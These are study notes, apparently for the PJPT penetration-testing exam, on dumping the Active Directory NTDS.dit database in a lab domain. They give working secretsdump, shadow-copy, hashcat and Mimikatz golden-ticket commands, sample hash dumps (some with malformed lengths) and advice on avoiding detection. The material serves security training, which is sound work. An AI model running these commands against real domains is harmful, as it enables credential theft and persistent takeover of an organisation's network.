# NTDS.dit Extraction and Analysis

## 🎯 Overview

**NTDS.dit** (NT Directory Services Directory Information Tree) is the **heart of Active Directory** - a database containing all domain information including user accounts, groups, security descriptors, and most importantly, **password hashes**.

> **"And oh yeah, password hashes"** - The golden treasure of domain compromise! 💰

## 📊 What is NTDS.dit?

**NTDS.dit** is a database used to store AD data. This data includes:
- **User information** - All domain user accounts and attributes
- **Group information** - Domain groups and membership
- **Security descriptors** - Access control and permissions
- **Password hashes** - NTLM hashes for all domain accounts

### Why It Matters for PJPT
- **Complete domain compromise** - Access to every user's password hash
- **Offline password cracking** - No network noise, unlimited time
- **Lateral movement goldmine** - Credentials for every system
- **Maximum impact demonstration** - Shows complete domain control

## 🔓 Extraction Methods

### Method 1: Secretsdump (Recommended)
```bash
# Direct extraction from Domain Controller
secretsdump.py MARVEL.local/pparker:'Password2'@192.168.138.132 -just-dc-ntlm

# Using hash instead of password
secretsdump.py -hashes :ntlm_hash MARVEL.local/admin@192.168.138.132 -just-dc-ntlm

# Extract with user information
secretsdump.py MARVEL.local/pparker:'Password2'@192.168.138.132 -just-dc
```

### Method 2: Direct File Access (If you have DC access)
```bash
# Copy NTDS.dit and SYSTEM hive
copy C:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
reg save HKLM\SYSTEM C:\temp\system.hive

# Extract locally
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

### Method 3: Volume Shadow Copy
```bash
# Create shadow copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive

# Extract
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

## 📋 Real-World Example Output

Based on the MARVEL domain screenshot, secretsdump reveals:

```bash
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9b25135001a69d53af33aa6cdc8915735:::
MARVEL.local\fcastle:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa880fe4b4e73b949b:::
MARVEL.local\tstark:1104:aad3b435b51404eeaad3b435b51404ee:40d3ddcc6d42c0ac000aaafe3cb5437b:::
MARVEL.local\pparker:1105:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391de0:::
MARVEL.local\SQLService:1106:aad3b435b51404eeaad3b435b51404ee:f4ab68f2b4501bcb024650d8fc5f973a:::
HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:64eac4280b92bbc8783c29bd638257fc:::
THEPUNISHERS:1107:aad3b435b51404eeaad3b435b51404ee:89371d74d536c916d94daa36c1b91e41:::
SPIDERMAN$:1108:aad3b435b51404eeaad3b435b51404ee:f49189d6b0b38ffcc04274cc9355c24c1:::
```

### Key Information Extracted:
- **Administrator hash**: `920ae267e048417fcfe00f49ecbd4b33`
- **krbtgt hash**: `9b25135001a69d53af33aa6cdc8915735` (Golden Ticket material!)
- **Service accounts**: SQLService with hash for potential lateral movement
- **User accounts**: fcastle, tstark, pparker - all with crackable hashes
- **Computer accounts**: Domain controllers and workstations

## 🔨 Hash Cracking Strategy

### 1. Prioritize High-Value Targets
```bash
# Extract specific high-value hashes
echo "920ae267e048417fcfe00f49ecbd4b33" > admin_hash.txt
echo "9b25135001a69d53af33aa6cdc8915735" > krbtgt_hash.txt
echo "f4ab68f2b4501bcb024650d8fc5f973a" > sqlservice_hash.txt
```

### 2. Crack with Hashcat
```bash
# Fast attack with common passwords
hashcat -m 1000 ntds_hashes.txt rockyou.txt -O

# Rule-based attack for password variations
hashcat -m 1000 ntds_hashes.txt rockyou.txt -r best64.rule

# Mask attack for corporate password patterns
hashcat -m 1000 ntds_hashes.txt -a 3 ?u?l?l?l?l?l?d?d?d?d
```

### 3. Analyze Password Patterns
```bash
# Create password statistics
hashcat -m 1000 ntds_hashes.txt --show | cut -d: -f2 > cracked_passwords.txt
python3 password_analyzer.py cracked_passwords.txt
```

## 🎫 Golden Ticket Connection

The **krbtgt hash** from NTDS.dit enables **Golden Ticket attacks**:

### What is a Golden Ticket?
- **When we compromise the krbtgt account, we own the domain**
- **We can request access to any resource or system on the domain**
- **Golden tickets == complete access to every machine**

### Creating Golden Tickets
```bash
# Extract domain SID and krbtgt hash from NTDS.dit
Domain SID: S-1-5-21-2894840767-2101617394-1820205593
krbtgt hash: 9b25135001a69d53af33aa6cdc8915735

# Create Golden Ticket with Mimikatz
mimikatz.exe "kerberos::golden /user:admin /domain:MARVEL.local /sid:S-1-5-21-2894840767-2101617394-1820205593 /krbtgt:9b25135001a69d53af33aa6cdc8915735 /ticket:golden.kirbi"

# Use Golden Ticket
mimikatz.exe "kerberos::ptt golden.kirbi"
```

## 🎯 PJPT Exam Strategy

### Time Allocation (15-20 minutes)
1. **5 minutes**: Extract NTDS.dit with secretsdump
2. **10 minutes**: Crack high-priority hashes (admin, service accounts)
3. **5 minutes**: Document findings and create Golden Ticket

### Quick Commands Reference
```bash
# One-liner NTDS extraction
secretsdump.py domain/user:pass@DC_IP -just-dc-ntlm

# Fast hash cracking
hashcat -m 1000 ntds_hashes.txt rockyou.txt --potfile-disable -o cracked.txt

# Golden Ticket creation
mimikatz.exe "kerberos::golden /user:admin /domain:target.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH"
```

### Documentation Priorities
1. **Screenshot secretsdump output** - Shows complete domain compromise
2. **Document cracked passwords** - Demonstrates password policy weaknesses
3. **Show Golden Ticket creation** - Proves persistent domain access
4. **List accessible systems** - Quantify the impact scope

## 🔍 Advanced Analysis Techniques

### Password Policy Assessment
```python
# Analyze password patterns from cracked hashes
import collections

passwords = open('cracked_passwords.txt').read().splitlines()
lengths = [len(p) for p in passwords]
print(f"Average password length: {sum(lengths)/len(lengths):.1f}")
print(f"Common passwords: {collections.Counter(passwords).most_common(5)}")
```

### Service Account Discovery
```bash
# Identify service accounts from NTDS output
grep -i "service\|sql\|iis\|exchange" ntds_output.txt

# Check for weak service account passwords
hashcat -m 1000 service_hashes.txt common_service_passwords.txt
```

### Privileged Account Enumeration
```bash
# Extract high-RID accounts (likely privileged)
awk -F: '$3 < 1200 {print $1":"$4}' ntds_output.txt

# Focus on accounts with RID < 1200 (built-in and early accounts)
```

## ⚠️ Operational Security

### Minimizing Detection
- **Use secretsdump remotely** - Avoid placing files on DC
- **Limit extraction scope** - Use `-just-dc-ntlm` for faster extraction
- **Clean up artifacts** - Remove any temporary files created

### Professional Considerations
- **Document everything** - NTDS extraction is high-impact activity
- **Time-box cracking** - Don't spend entire exam on password cracking
- **Focus on impact** - Show what access the hashes provide

## 🏆 Success Metrics

A successful NTDS.dit extraction includes:
- ✅ **Complete hash extraction** - All domain accounts dumped
- ✅ **High-value hash cracking** - Admin and service accounts cracked
- ✅ **Golden Ticket creation** - Persistent domain access established
- ✅ **Impact documentation** - Clear business impact assessment
- ✅ **Lateral movement proof** - Use hashes to access additional systems

## 🔗 Integration with Other Attacks

### Attack Chain Progression
1. **Initial Access** → **Privilege Escalation** → **Domain Admin**
2. **NTDS.dit Extraction** → **Hash Cracking** → **Golden Ticket**
3. **Lateral Movement** → **Persistence** → **Impact Assessment**

### Tool Integration
- **Secretsdump** for extraction
- **Hashcat** for cracking
- **Mimikatz** for Golden Tickets
- **CrackMapExec** for hash validation
- **PsExec/WMIExec** for lateral movement

---

## 📝 Final Notes

**NTDS.dit extraction represents the pinnacle of Active Directory compromise.** It provides:
- **Complete visibility** into domain security posture
- **Unlimited offline attack time** against password hashes  
- **Golden Ticket capability** for persistent access
- **Maximum impact demonstration** for client value

**Remember**: The goal isn't just to extract the database - it's to demonstrate the **complete compromise of domain security** and provide **actionable intelligence** for remediation.

**PJPT Success Tip**: Focus on **high-impact findings** rather than cracking every single hash. A few cracked admin passwords and a Golden Ticket demonstrate more value than hundreds of user passwords! 🎯 